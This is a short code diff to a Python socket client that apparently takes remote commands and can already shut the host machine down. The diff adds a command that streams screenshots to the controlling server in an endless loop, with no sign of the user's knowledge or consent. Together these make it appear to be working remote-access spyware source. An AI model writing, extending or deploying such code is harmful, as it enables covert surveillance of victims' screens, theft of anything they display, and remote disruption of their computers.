@@ -2,6 +2,10 @@ import socket
 import pickle
 import os
 import shutil
+import pyautogui
+
+from PIL import Image
+import io
 
 HEADERSIZE = 10
 
@@ -60,5 +64,14 @@ while True:
                     os.system("shutdown /s /t 1")
                 elif os.name == 'posix':  # Linux
                     os.system("shutdown now")
+            elif command == "223":
+                while True:
+                    screenshot = pyautogui.screenshot()
+                    img_byte_arr = io.BytesIO()
+                    screenshot.save(img_byte_arr, format='PNG')
+                    img_byte_arr = img_byte_arr.getvalue()
+                    img_msg = pickle.dumps(img_byte_arr)
+                    img_msg = bytes(f"{len(img_msg):<{HEADERSIZE}}", 'utf-8') + img_msg
+                    s.send(img_msg)
             new_msg = True
             full_msg = b""
